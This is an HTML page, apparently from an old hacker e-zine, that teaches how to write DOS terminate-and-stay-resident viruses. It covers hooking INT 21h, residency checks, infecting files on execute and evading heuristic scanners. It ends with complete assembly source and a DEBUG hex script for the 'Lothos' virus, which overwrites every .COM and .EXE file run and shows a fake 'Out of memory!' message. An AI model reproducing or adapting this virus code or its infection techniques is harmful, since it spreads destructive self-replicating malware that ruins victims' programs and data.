@@ -1,0 +1,323 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - </TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<p align="center"><b><font color="#004080" size="+3">Writing TSR Viruses</font><font color="#004080"><BR>
+  <font size="+1">by - EXE-Gency</font></font></b><BR>
+</p>
+<hr>
+<BR>
+This is designed as a basic tutorial to writing Terminate and Stay Resident DOS 
+viruses. The code and examples can also be used to write other DOS TSR programs 
+(such as keytrapping programs.) Of couse all the source code is in assembly, so 
+if you're having trouble understanding any of it you'll need to read the assembly 
+tutorial (written by me) in the last issue of APT. Alternatively you can send 
+me an email: <A HREF="mailto:exegency@hotmail.com">EXE-Gency.</A>
+<P>Okee Dokee, here we go.</P>
+<P>Before I'll explain TSR programs and virii I'll take a bit of time to remind you about interrupts. Whenever a program is running, interrupts occurs. An interrupt can be caused by hardware (such as a key being pressed on the keyboard, or a byte coming through the modem) or by the software (the operating system requesting a file to be opened.) When an interrupt occurs, a program called an interrupt handler is invoked to deal with the interrupt. There is a different interrupt handler for each of the 256 different interrupts. For example, when a key is pressed on the keyboard, interrupt 09h is invoked. This interrupt handler reads the character pressed from the keyboard and writes it to memory, in preparation for when a key is requested. The handler then returns control back to the originl program that was running prior to the interruption. What a TSR virus does is install it's own interrupt handler for the DOS interrupt (21h) so that when ever a file is executed, the virus interrupt handler is invoked before the actual DOS one. The virus can 'hijack' the program being executed, infect it, then allow it to run as per normal.
+<P>There are three main advantages that TSR viruses have over run-time viruses:</P>
+<ol>
+  <li> TSR viruses are always more virulent than run-time viruses. (This means 
+    that they can spread more quickly.) This is because programs are automatically 
+    infected when programs are run, regardless of where in the directory structure 
+    they exist.</li>
+  <li> Secondly, because the virus interrupt handler is invoked before the normal 
+    DOS handler, it is possible to intercept things other than just execute. For 
+    example, it is possible to write TSR viruses that report the original size 
+    of infected files whenever a 'DIR' is performed.</li>
+  <li> Believe it or not, when you get the hand of TSR virus programming, you 
+    will find that it is actually easier than writing run-time virii!</li>
+</ol>
+<P>First things first. When an infected program is run, it check if another program has been run and the virus is already resident in memory. The easiest way of doing this is for the virus to declare a new function of INT 21h (one that is not used, E.G. function 0FFh) that will return a certain value when the new function is requested. For example, if the new function 0FFh and the expected return value (if the virus is already resident in memory) is 55h (in the AH register) then we could check for the virus being resident in memory:<P>
+<blockquote>
+  <PRE>
+    mov ah, 0FFh
+    int 21h
+    cmp ah, 55h
+    je  DontGoMemoryResident
+    jmp GoMemoryResident
+</PRE>
+</blockquote>
+<P>Of couse the virus interrupt handler for INT 21h would have to accomidate for this. The code below shows how the new interrupt (virus) handler for INT 21h would respond if a call to INT 21h with 0FFh in the AH register occured:</P>
+<blockquote>
+  <PRE>
+NewVirusInt21hHandler:
+    cmp ah, 0FFh
+    jne OtherFunctions
+    mov ah, 55h
+    iret
+OtherFunctions:
+    ; This is where our virus checks for other functions of INT 21h (E.G. 4Bh for execute)
+</PRE>
+</blockquote>
+<P>The code above will be executed whenever INT 21h is called. The code checks if the value in the AH register is 0FFh and if so, returns to the calling program (using interrupt return IRET) with the value 55h in the AH register. This tells the calling program (an infected file) that the virus is already memoery resident, and doesn't need to go resident again. If the value in AH is not 0FFh (file opened 3Dh, display message 09h etc.) then the virus handler continues. At this point it will check if the function 4Bh (execute) is being requested, and if so, infect the file.</P>
+<P>I'm getting a bit ahead of myself now, because I haven't even told you how the virus hooks INT 21h or goes memory resident. Well, here's how it happens. Presuming that the virus is not memory resident (the value in the AH register was not 55h after a call to function 0FFh of INT 21h) then the infected file must get the segment and offset of the INT 21h handler. This is so we can set up our own interrupt handler between the intrerrupt vector table and the orignial INT 21h handler. There are two ways of getting the segment and offset of an interrupt. The first of these methods is to use the function 35h if INT21h. This function requires 35h to be in AH and the interrupt number to be in AL. It returns the segment and offset of the existing interrupt handler in ES and BX respectivly. Study the code below if you do not understand the above explaination:</P>
+<blockquote>
+  <PRE>
+    mov ah, 35h
+    mov al, 21h
+    int 21h
+    mov OldInt21hOffset, bx
+    mov OldInt21hSegment, es
+.
+.
+New virus interrupt 21h handler
+.
+.
+                 db 0EAh
+OldInt21hOffset  dw 0000h
+OldInt21hSegment dw 0000h
+</PRE>
+</blockquote>
+<P>The above code gets the segment and offset of the existing INT 21h handler and puts them in the two variables. It is important to log the old interrupt segment and offset, so that we can still call the old interrupt without crashing the computer. The 'db 0EAh' before the two word variabels is the JMP FAR SEG:OFS machine code. By running this section of the code, the program flow is returned to the old (original) DOS INT 21h handler.</P>
+<P>The other way of obtaining the segment and offset of the old INT 21h handler is to read directly from the Interrupt Vector Table (IVT). The IVT can be found at segment:offset 0000:0000 (the lowest possible part of memory. Because the data for each of the 256 interrupts is 4 bytes (two words) long, you can obtain the segment and offset by multiplying the interrupt number by four. For example, to obtain the segment and offset of the old INT 21h handler by reading directly from the interrupt vector table, use the code below:</P>
+<blockquote> 
+  <PRE>
+    push es
+    mov ax, 0000h
+    mov es, ax 
+    mov bx, word ptr es:[84h]
+    mov OldInt21hOfs, bx
+    mov bx, word ptr es:[86h]
+    mov OldInt21hSeg, bx 
+    pop es
+.
+.
+New virus interrupt 21h handler
+.
+.
+                 db 0EAh
+OldInt21hOffset  dw 0000h
+OldInt21hSegment dw 0000h
+</PRE>
+</blockquote>
+<P>This code moves the word at 0000:0084h to OldInt21Offset and the word at 0000:0084h to OldInt21Segment. Basically the result is the same as for the other code, but reading direct from the IVT can sometimes prevent triggereing heuristic virus scanners. You can use whichever method you prefer.</P>
+<P>Now that we have the original INT 21h handler segment and offset, it is time to set our own interrup handler for INT 21h. Once again, this can be done one of two ways. The first way is to use function 35h of INT 21h. Function 25h takes the followinf inputs: AH=25h, AL=Interrupt number, DS=segment of new handler, DX=offset of new handler. Below is the code that does this:</P>
+<blockquote>
+  <PRE>
+    mov ah, 25h
+    mov al, 21h
+    push cs
+    pop ds
+    lea dx, NewInt21hHandler
+    int 21h
+.
+.
+.
+NewInt21hHandler:
+</PRE>
+</blockquote>
+<P>This makes all calss to INT 21h go to NewInt21hHandler instead of the old DOS one. Of couse, we will still redirect calls to the old INT 21h when the virus is not involved in the function being requested.</P>
+<P>The second way to set an interrupt handler is by directly modifying the interrupt vector table. You simply find out the offset of the new handler at put it at address 0000:0084h and put the segment of the new handler at 0000:0086h. Examine the code below:</P>
+<blockquote>
+  <PRE>
+    push es
+    mov ax, 0000h
+    mov es, ax
+    mov word ptr es:[84h], offset NewInt21hHandler
+    mov word ptr es:[86h], cs
+    pop es
+.
+.
+.
+NewInt21hHandler:
+</PRE>
+</blockquote>
+<P>Once again, you don't have to use both methods to set the interrupt handler, one is sufficent.</P>
+<P>Now the new interrupt handler is set up, it's time to put out virus in memory. There's various ways of doing this (modifying the memory control blocks etc.) but for .COM files, the normal DOS interrupt for going memory resident is sufficient. This interrupt is numbered 27h and the only input it needs is DX which should hold the size of the memory resident code:</P>
+<blockquote>
+  <PRE>
+    lea dx, EndOFVirus
+    int 27h
+</PRE>
+</blockquote>
+<P>The virus is now memory resident, and the program will return to the operating system. From now on, all calls to INT 21h will go through our virus before getting to the normal DOS handler.</P>
+<P>Now we have written the code to go memory resident and set the interrupt handler, it is now time to write the actual code of the new INT 21h handler. Actually, we have already written some of it (the part the returns 55h when a calling program asks if the virus is already in memory) so all that needs to be done is write the code for when other functions are executed. Most viruses infect files on execute (this is when AH holds 4Bh) so we have to check if afile is being executred and if so infect it. If a file is not being executed we need to pass control back to the original DOS interrupt handler. This prevents crashes when calls to other DOS functions are made.</P>
+<P>Function 4Bh takes the following inputs: AH=4Bh, AL=execute options (unimportant) and DX points to ASCIIZ filename. This is incredably convienient as the function 3Dh (open file) also needs the filename to be pointed at by DX. Put this all together and you get the following:</P>
+<blockquote>
+  <PRE>
+NewVirusInt21hHandler:
+    cmp ah, 0FFh
+    jne OtherFunctions
+    mov ah, 55h
+    iret
+OtherFunctions:
+    cmp ah, 4Bh
+    je Infect
+    jmp OldInt21hHandler
+    mov ah, 3Dh ; OPEN FILE
+    ; Remeber! DX already points to ASCIIZ filename
+    int 21h
+.
+.
+.
+Infect file
+.
+.
+.
+    mov ah, 3Eh ; CLOSE FILE
+    int 21h
+; Now go to old INT 21h handler
+OldInt21hHandler:db 0EAh
+OldInt21hOffset  dw 0000h
+OldInt21hSegment dw 0000h
+</PRE>
+</blockquote>
+<P>All pretty simple, huh? If you're confused have a look at some of the TSR programs I've written. Also, below is the full documented source code and debug script for my first TSR virus, Lothos.......</P>
+<HR>
+<P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD ALIGN=CENTER>
+L O T H O S - V I R U S<BR>
+b y  -  E X E - G e n c y<BR>
+<A HREF="mailto:exegency@hotmail.com">exegency@hotmail.com</A><BR>
+<TD>
+<TR>
+</TABLE>
+</CENTER>
+<p></P>
+<P>Lothos is my first ever TSR virus. Once executed, it remains in memory and overwrites all .COM and .EXE files run (perhaps .SYS, .OVL and other executables....) It was only a quick stab at a resident virus so it doesn't save the file attributes, time/date blah, blah. So fucking what, the infected files become unusable. Hmmmm. Um! The virus hooks INT 21h and infected whenever AH=4Bh (execute) and also includes a INT 24h (critial error handler) handler to prevent some embarassing error messages when writing to protected disks. To compile type:</P>
+<blockquote>
+  <PRE>
+TASM LOTHOS.ASM
+TLINK /T LOTHOS.OBJ
+</PRE>
+</blockquote>
+<P>LOTHOS.COM is the virus SO BE CAREFUL</P>
+<HR>
+<blockquote>
+  <PRE>
+prog            segment                 ; Setup segments
+                assume  CS:prog, DS:prog; CS+DS in same seg
+                org     100h            ; .COM file
+.286 ; Assembly 286 code (allows for PUSHA and POPA instructions)
+VIRUS_SIZE      equ     offset VirusEnd - offset VirusStart
+
+VirusStart:     mov     ah, 09h          ; Display message
+                lea     dx, FakeErrorMsg ; DX points to 'Out of memory!'
+                int     21h              ; Call DOS interrupt
+
+                mov     ah, 0FFh            ; Is virus resident?
+                int     21h                 ; Call DOS interrupt
+                cmp     ah, 55h             ; Is AH==55h
+                je      EndVirus            ; Already resident
+
+                mov     ax, 3521h           ; Get Seg:Ofs of INT 21h
+                int     21h                 ; Call DOS interrupt
+                mov     OldInt21hOfs, bx    ; Save offset
+                mov     OldInt21hSeg, es    ; Save segment
+
+                mov     ax, 2521h         ; Set virus INT 21h Handler
+                lea     dx, NewInt21hHand ; DX points to new handler
+                int     21h               ; Call DOS interrupt
+
+                mov     ax, 2524h         ; Set fake INT 24h handler
+                lea     dx, FakeInt24hHand; DX points to new handler
+                int     21h               ; Call DOS interrupt
+
+                lea     dx, VirusEnd      ; DX points to end of virus
+                int     27h               ; Go memory resident
+EndVirus:       int     20h               ; End program
+
+; * * *   N E W   V I R U S   I N T   2 1 H   H A N D L E R   * * *
+
+NewInt21hHand:  pushf                       ; Push flags
+                cmp     ah, 0FFh            ; Is AH==0FFh
+                jne     NextFunction        ; no
+                mov     ah, 55h             ; AH=55h
+                popf                        ; Restore flags
+                iret                        ; Interrupt return
+
+NextFunction:   cmp     ah, 4Bh       ; Is someone executing a file?
+                jne     OldInt21hHand ; Nope...Run old INT 21h
+
+Infect:         pusha      ; Push all Registers (except segment ones)
+                push    ds ; Save DS
+                mov     ax, 3D01h ; Open file for writing
+                ; No need to set DX to point to ASCIIZ filename, as function
+                ; 4Bh (execute) already does it.
+                int     21h ; Call DOS interrupt
+                jc      Error ; Error?
+
+                xchg    ax, bx ; Put filehandle in BX
+
+                mov     ah, 40h        ; Write virus
+                lea     dx, VirusStart ; DX points to start of virus
+                push    cs             ;
+                pop     ds             ; MOV DS, CS
+                mov     cx, VIRUS_SIZE ; CX holds virus size
+                int     21h            ; Call DOS interrupt
+                jc      Error          ; Error?
+
+                mov     ah, 3Eh ; Close file
+                int     21h     ; Call DOS interrupt
+
+Error:          pop     ds ; Restore DS
+                popa       ; Restore other registers
+OldInt21hHand:  popf       ; Restore flags
+JumpFar         db      0EAh  ; \
+OldInt21hOfs    dw      0000h ;  &gt; JMP FAR OLDINT21HSEG:OLDINT21HOFF
+OldInt21hSeg    dw      0000h ; /
+
+; * * *   F A K E   I N T   2 4 h   H A N D L E R   * * *
+
+FakeInt24hHand: cmp     di, 14h          ; Insufficient disk space?
+                jne     ReturnFakeError  ; Return fake error message
+                push    cs               ; Save CS register
+                pop     ds               ; Restore in DS
+                mov     ah, 09h          ; Display message
+                lea     dx, VirusDetails ; DX points to virus details
+                int     21h              ; Call DOS interrupt
+                jmp     $                ; Loop forever
+
+ReturnFakeError:mov     al, 00h          ; No sir, there's no error here :)
+                iret                     ; Interrupt return
+
+; * * *   P R O G R A M   D A T A   * * *
+
+FakeErrorMsg    db      'Out of memory!$' ; Fake Error Message
+VirusDetails    db      '[Lothos] virus written by EXE-Gency of '
+                db      'About Phreaking Time$'
+VirusEnd:
+prog            ends
+end             VirusStart
+</PRE>
+</blockquote>
+<HR>
+<P>Debug script follows. Copy and paste it to a text file, go to the DOS prompt and type:
+<blockquote>
+  <PRE>
+DEBUG &lt; LOTHOS.SCR
+</PRE>
+</blockquote>
+<p></P>
+<HR>
+<blockquote> 
+  <PRE>
+N LOTHOS.COM
+E 0100 B4 09 BA 7A 01 CD 21 B4 FF CD 21 80 FC 55 74 22 
+E 0110 B8 21 35 CD 21 89 1E 63 01 8C 06 65 01 B8 21 25 
+E 0120 BA 34 01 CD 21 B8 24 25 BA 67 01 CD 21 BA C5 01 
+E 0130 CD 27 CD 20 9C 80 FC FF 75 04 B4 55 9D CF 80 FC 
+E 0140 4B 75 1E 60 1E B8 01 3D CD 21 72 13 93 B4 40 BA 
+E 0150 00 01 0E 1F B9 C5 00 CD 21 72 04 B4 3E CD 21 1F 
+E 0160 61 9D EA 00 00 00 00 83 FF 14 75 0B 0E 1F B4 09 
+E 0170 BA 89 01 CD 21 EB FE B0 00 CF 4F 75 74 20 6F 66 
+E 0180 20 6D 65 6D 6F 72 79 21 24 5B 4C 6F 74 68 6F 73 
+E 0190 5D 20 76 69 72 75 73 20 77 72 69 74 74 65 6E 20 
+E 01A0 62 79 20 45 58 45 2D 47 65 6E 63 79 20 6F 66 20 
+E 01B0 41 62 6F 75 74 20 50 68 72 65 61 6B 69 6E 67 20 
+E 01C0 54 69 6D 65 24 
+RCX
+00C5
+W
+Q
+</PRE>
+</blockquote>
+<hr>
+</BODY>
+</HTML>
